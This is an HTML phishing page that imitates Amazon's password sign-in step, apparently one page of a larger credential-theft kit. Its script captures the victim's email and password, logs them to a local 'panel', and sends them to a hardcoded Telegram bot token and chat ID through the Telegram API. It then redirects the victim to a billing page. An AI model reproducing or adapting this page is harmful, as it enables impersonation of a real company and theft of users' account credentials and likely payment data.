<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — Sign In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px 20px; }
        .logo { margin: 10px 0 20px; }
        .logo img { height: 30px; }
        .kotak { width: 100%; max-width: 348px; padding: 20px 26px; border: 1px solid #ddd; border-radius: 8px; background: #fff; }
        .kotak h1 { font-size: 28px; font-weight: 400; margin-bottom: 15px; }
        .baris-email { font-size: 14px; color: #555; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .ubah { color: #0066c0; text-decoration: none; font-size: 14px; }
        .label { font-weight: 700; font-size: 13px; margin: 0 0 6px; display: inline-block; }
        .lupa-sandi { float: right; font-size: 13px; }
        .lupa-sandi a { color: #0066c0; text-decoration: none; }
        .input { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; height: 32px; outline: none; margin-bottom: 20px; }
        .input:focus { border-color: #007185; box-shadow: 0 0 0 2px #c8f0f4; }
        .tombol-masuk { width: 100%; padding: 6px 10px; background: linear-gradient(to bottom, #f7df89, #ecc000); border: 1px solid #d5b000; border-radius: 8px; font-size: 14px; cursor: pointer; height: 40px; }
        .tombol-masuk:disabled { background: #e9e9e9; border-color: #ccc; cursor: not-allowed; opacity: 0.7; }
        .bawah { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; width: 100%; max-width: 500px; text-align: center; font-size: 11px; color: #555; }
        .bawah a { color: #0066c0; text-decoration: none; margin: 0 8px; }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1>Sign in</h1>
        <div class="baris-email">
            <span id="tampil-email"></span>
            <a href="amazon.html" class="ubah">Change</a>
        </div>
        <label class="label" for="sandi">Password</label>
        <span class="lupa-sandi"><a href="#">Forgot password?</a></span>
        <input type="password" id="sandi" class="input">
        <button id="btn-masuk" class="tombol-masuk">Sign in</button>
    </div>
    <div class="bawah">
        <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
        <p style="margin-top:5px; color:#767676;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
// Ambil pengaturan dari panel
const BOT_TOKEN = localStorage.getItem('telegram_bot_token') || '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
const CHAT_ID = localStorage.getItem('telegram_chat_id') || '7808815199';

const inputSandi = document.getElementById('sandi');
const tampilEmail = document.getElementById('tampil-email');
const btnMasuk = document.getElementById('btn-masuk');
let emailPengguna = '';

window.addEventListener('load', function() {
    emailPengguna = localStorage.getItem('email_pengguna');
    if (!emailPengguna) { window.location.href = 'amazon.html'; return; }
    tampilEmail.textContent = emailPengguna;
});

inputSandi.addEventListener('keydown', e => e.key==='Enter' && kirimData());
btnMasuk.addEventListener('click', kirimData);

function tambahLoginKePanel(email, sandi) {
    // Baca data yang sudah ada
    const daftarLogin = JSON.parse(localStorage.getItem('data_login') || '[]');
    daftarLogin.push({
        email: email,
        password: sandi,
        waktu: new Date().toLocaleString('id-ID')
    });
    localStorage.setItem('data_login', JSON.stringify(daftarLogin));
    
    // Tambah penghitung LOGIN
    let jumlahLogin = parseInt(localStorage.getItem('stat_login') || '0');
    localStorage.setItem('stat_login', jumlahLogin + 1);
    localStorage.setItem('stat_total', parseInt(localStorage.getItem('stat_total') || '0') + 1);
}

async function kirimData() {
    const sandi = inputSandi.value.trim();
    if (!sandi) { inputSandi.focus(); return; }

    localStorage.setItem('kata_sandi', sandi);

    // === TAMBAH KE PANEL ===
    tambahLoginKePanel(emailPengguna, sandi);

    // === KIRIM KE TELEGRAM ===
    const pesan = `🔐 *LOGIN*\n━━━━━━━━━━━━━━━━━━━━━\n📧 Email: ${emailPengguna}\n🔑 Password: ${sandi}\n━━━━━━━━━━━━━━━━━━━━━`;
    
    btnMasuk.disabled = true;
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: pesan, parse_mode:'Markdown'})
        });
    } catch (e) { console.error(e); }

    window.location.href = 'billing.html';
}
</script>
</body>
</html>
